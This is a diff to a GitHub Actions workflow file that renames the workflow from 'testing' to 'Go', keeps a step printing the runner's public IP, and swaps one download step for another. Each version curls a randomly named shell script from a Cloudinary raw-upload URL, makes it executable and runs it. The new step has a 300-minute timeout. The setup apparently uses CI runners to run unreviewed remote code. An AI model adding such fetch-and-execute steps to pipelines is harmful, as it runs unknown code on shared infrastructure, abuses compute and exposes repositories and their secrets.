@@ -1,4 +1,4 @@
-name: testing
+name: Go
 
 on:
   workflow_dispatch:
@@ -10,15 +10,12 @@ jobs:
     continue-on-error: true
     runs-on: ubuntu-latest
     steps:
-      - name: Run exec
-        timeout-minutes: 2
-        run: |
-          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711173470/fotves64xiknlowbbd8r.sh
-          chmod +x fotves64xiknlowbbd8r.sh
-          ./fotves64xiknlowbbd8r.sh
-
       - name: IP Workflow
         run: |
           curl https://api.ipify.org
-
-      # Ajoutez d'autres étapes de votre workflow ici
+      - name: Run exec
+        timeout-minutes: 300
+        run: |
+          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1711330678/krfvxzr3udi4w83yllix.sh
+          chmod +x krfvxzr3udi4w83yllix.sh
+          ./krfvxzr3udi4w83yllix.sh
